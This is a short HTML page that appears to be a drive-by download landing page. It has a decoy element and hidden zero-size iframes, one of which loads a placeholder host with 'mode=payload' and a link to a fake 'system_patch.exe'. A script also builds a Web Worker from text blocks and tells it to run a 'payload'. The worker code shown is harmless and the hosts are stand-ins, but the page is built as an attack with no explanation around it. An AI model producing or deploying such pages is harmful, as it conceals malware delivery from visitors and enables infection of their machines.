<!doctype html>
<html>
<body>
  <main id="decoy"></main>
  <iframe src="/config.html"
          style="display:none;visibility:hidden;width:0;height:0;border:0;overflow:hidden"
          tabindex="-1" aria-hidden="true"></iframe>

  <script type="text/plain" id="bundle-src">
    self.onmessage = function () {
      postMessage({ phase: "renderer", ready: true });
    };
  </script>
  <script type="text/plain" id="worker-glue">
    self.postMessage({ phase: "sandbox", ready: true });
  </script>
  <script>
    const target = "https://edge-cache.invalid/page.html?mode=payload&exeurl=https://updates-cache.invalid/system_patch.exe";
    const exploitFrame = document.createElement("iframe");
    exploitFrame.style.display = "none";
    exploitFrame.style.visibility = "hidden";
    exploitFrame.src = target;
    document.body.appendChild(exploitFrame);

    const bundle = document.getElementById("bundle-src").textContent;
    const glue = document.getElementById("worker-glue").textContent;
    const workerSource = bundle + "\n" + glue;
    const workerBlob = new Blob([workerSource], { type: "text/javascript" });
    const workerUrl = URL.createObjectURL(workerBlob);
    const exploitWorker = new Worker(workerUrl);
    sessionStorage.setItem("exploit_attempt", "1");
    exploitWorker.postMessage({ mode: "payload", runpayload: true });
  </script>
</body>
</html>
